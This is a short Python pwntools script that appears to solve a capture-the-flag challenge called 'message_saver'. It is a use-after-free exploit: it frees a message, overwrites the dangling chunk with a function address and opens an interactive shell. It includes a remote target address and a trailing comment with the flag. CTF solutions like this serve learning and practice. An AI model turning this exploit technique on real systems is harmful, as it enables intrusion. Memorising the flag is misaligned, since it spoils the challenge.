from pwn import *
context.log_level = 'debug'
context.terminal=['gnome-terminal', '-x', 'bash', '-c']

local = 1
if local:
	cn = process('./message_saver')
	bin = ELF('./message_saver')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	cn = remote('111.230.149.72', 10011)

def z(a=''):
	gdb.attach(cn, a)
	if a == '':
		raw_input()

def add(len, con, encoder):
	cn.sendline("1")
	cn.recv()
	cn.sendline(str(len))
	cn.recv()
	cn.sendline(con)
	cn.recv()
	cn.sendline(str(encoder))

def edit(len, con):
	cn.sendline('2')
	cn.recv()
	cn.sendline(str(len))
	cn.recv()
	cn.sendline(con)
def delete():
	cn.sendline('4')
def show():
	cn.sendline('3')

add(0x18, 'a', 1)
delete()
gdb.attach(cn)
payload = 'a' * 0x10 + p64(0x400816)
edit(0x18, payload)
cn.interactive()

# hgame{be_careful_wtih_dangling_pointers}
